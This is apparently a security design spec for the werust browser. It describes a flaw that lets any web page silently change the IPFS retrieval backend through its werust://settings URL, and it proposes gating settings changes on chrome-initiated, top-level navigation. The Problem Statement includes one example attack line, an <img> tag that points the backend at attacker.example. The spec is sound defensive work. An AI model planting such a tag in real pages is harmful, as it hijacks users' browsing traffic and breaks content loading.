---
title: "A web page must not be able to change werust's settings: gate werust:// mutations on user intent"
slug: settings-mutations-require-user-intent
---

> Launch snapshot — records intent at creation, NOT maintained. Current truth: `docs/adr/` (decisions) + the code; remaining work: `work/tasks/ready/` tasks.
> Tasked 2026-08-16 (`to-task`): the Implementation / Testing detail this spec carried moved INTO the tasks it emitted (`work/tasks/`, carrying `spec: settings-mutations-require-user-intent`), which are the current truth for what to build. Durable rationale is recorded as ADRs by the tasks that decide it, not predicted here.

## Problem Statement

werust's internal settings page is served at `werust://settings`, and it **applies and persists a change straight off the request's query string**: `werust://settings?backend=<kind>&url=<endpoint>` selects and saves the IPFS retrieval backend. The page itself is a `GET` form, which is why the handler works that way.

There is no check that the user asked for it. Specifically, there is no notion anywhere in the tree of a user gesture or a chrome-initiated navigation — a search for one finds only redirect-chain bookkeeping. And the `werust` scheme is registered through the same scheme-handler seam that serves page content, on all five edges, for **any** request including sub-resources.

So any page can silently repoint the user's retrieval backend:

```html
<img src="werust://settings?backend=custom&url=http://attacker.example/">
```

No navigation, no click, no visible change. From then on every `ipfs://` load fetches through an endpoint the attacker chose.

**Two distinct harms, one live today and one imminent.**

*Live today: a privacy and availability attack.* The retrieval backend is an EGRESS choice — it sees every content-addressed site the user visits. Repointing it hands the user's browsing to a third party of the attacker's choosing, or to a dead endpoint that simply breaks content loading. It cannot forge content, because bytes stay hash-verified against their CID, so this is not a content-integrity break. It does not need to be one.

*Imminent: it defeats the refusal path the trust work is built on.* `withhold-changed-content-until-trusted` withholds a changed version and offers the user a choice; refusing falls back to **re-fetching the version they trusted through the configured backend**. A hostile page that has repointed that backend at a dead endpoint guarantees the fallback fails, leaving the user with one working option: accept the update they just refused. That is precisely the coercion the withholding exists to prevent, reachable with one `<img>` tag.

This is why it is its own spec rather than a note inside another: it is a real bug now, it is a prerequisite for two different specs, and it is small.

## Solution

A settings mutation requires **user intent**, established by the chrome rather than claimed by the request.

Two properties, both necessary:

1. **Only a top-level navigation may mutate.** A sub-resource request for `werust://settings` — an `<img>`, a `fetch`, an iframe, a stylesheet — must never apply a change. Reading the page is harmless; applying a change is not.
2. **Only a chrome-initiated navigation may mutate.** A page navigating the window to a mutating `werust://` URL is still the page acting, not the user. The settings page is reached from werust's own UI, and a submission from that page is the user acting within a surface werust drew. A navigation originating in web content is not.

A request that fails the gate still RENDERS the settings page — read-only, showing current values, with the attempted change not applied. Failing closed on the mutation while still serving the page keeps the surface honest and avoids turning a blocked attack into a broken browser.

The core already distinguishes a main-frame request from a sub-resource for the redirect logic, so the first property has a precedent to follow rather than a mechanism to invent. The second needs the chrome to mark navigations it initiated, which is new and is the substance of this work.

## User Stories

1. As a user, I want a web page unable to change which server werust fetches content through, so that a site I visit cannot silently choose who observes the rest of my browsing.
2. As a user, I want a page unable to point my retrieval backend at a dead endpoint, so that it cannot break content loading or engineer a situation where refusing an untrusted update is impossible.
3. As a user, I want a sub-resource request for the settings page never to apply a change, so that an `<img>` tag or a `fetch` is not a settings write.
4. As a user, I want a blocked attempt to still show me the settings page with its real current values, so that a refused mutation does not look like a broken browser.
5. As a user, I want my own settings changes to keep working exactly as they do now, so that the fix is invisible when I am the one acting.
6. As a user on any of the five edges, I want the same protection, so that the weakest edge does not define werust's safety.
7. As a werust developer, I want the gate asserted by a test that a page-initiated mutation is refused, so that a future edge or handler cannot quietly reintroduce the hole.

## Out of Scope

- **Adding new settings, or a new settings surface.** This gates the mutation path that exists.
- **Authenticating READS of `werust://` pages.**
- **Any other page-reachable internal surface.** If one is found, it is its own finding; this spec covers the settings mutation path it names.
- **The retrieval backend's default choice** — that is `retrieval-default-egress-before-final-release`. This spec makes the setting un-hijackable; it does not change what it defaults to.
